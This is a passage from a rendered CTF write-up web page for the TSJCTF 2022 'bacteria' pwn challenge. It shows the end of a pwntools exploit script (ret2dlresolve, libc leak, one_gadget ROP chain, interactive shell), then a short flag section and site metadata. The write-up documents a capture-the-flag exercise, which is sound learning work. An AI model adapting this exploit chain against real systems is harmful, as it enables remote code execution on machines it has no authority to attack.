\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Get leaked address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Leak address: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"write_addr\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1111d0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc base: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 6: Get flag ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"one_gadget \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6c7e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"xor_r12_pop_r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd31f0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, not use more\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" xor_r12_pop_r12\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# For that pop r12\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" one_gadget\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"4-get-flag\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,e.jsx)(n.p,{children:\"I made this write up when the server closed so I was only able to obtain the fake flag:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_flag.png\",alt:\"get_flag.png\"})})]})}}var _=f;function y(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return x;})();\n;return Component;","toc":[{"value":"bacteria","url":"#bacteria","depth":2},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Stack pivot","url":"#stage-1-stack-pivot","depth":3},{"value":"Stage 2: Fake address and structure of Elf64_Sym","url":"#stage-2-fake-address-and-structure-of-elf64_sym","depth":3},{"value":"Stage 3: Fake address and structure of Elf64_Rela","url":"#stage-3-fake-address-and-structure-of-elf64_rela","depth":3},{"value":"Stage 4. Fake address and structure of STRTAB","url":"#stage-4-fake-address-and-structure-of-strtab","depth":3},{"value":"Stage 5. Conduct ret2dlresolve \u0026 Leak libc address","url":"#stage-5-conduct-ret2dlresolve--leak-libc-address","depth":3},{"value":"Stage 6. Get shell","url":"#stage-6-get-shell","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"25 min read","minutes":24.08,"time":1444800,"words":4816},"slug":"tsjctf-2022/bacteria","fileName":"tsjctf-2022/bacteria.md","title":"TSJCTF 2022 – bacteria","date":"2022-03-02T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["TSJCTF 2022","pwn","Shell","Buffer Overflow","Binary Exploit"],"summary":"Buffer overflow for shell.","canonical":"https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon\u0026s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"Ugra CTF Quals 2022 – noteasy03","date":"2022-03-02T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["Ugra CTF Quals 2022","Crypto","ECC","Elliptic Curve","Misc","Cipher","Caesar"],"summary":"Single table substitution on Elliptic Curve","canonical":"https://yanhuijessica.github.io/Chictf-Writeups/crypto/noteasy03/","slug":"ugra-ctf-quals-2022/noteasy03"},"next":{"title":"Ugra CTF Quals 2022 – Хохорейсинг","date":"2022-03-04T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Ugra CTF Quals 2022","Crypto","XOR","Automation","Web Socket"],"summary":"Sometimes you have to google the outputs xD","slug":"ugra-ctf-quals-2022/xorxorracing"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["tsjctf-2022","bacteria"]},"buildId":"qjVMIloeGVfOBGlHlZkTe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>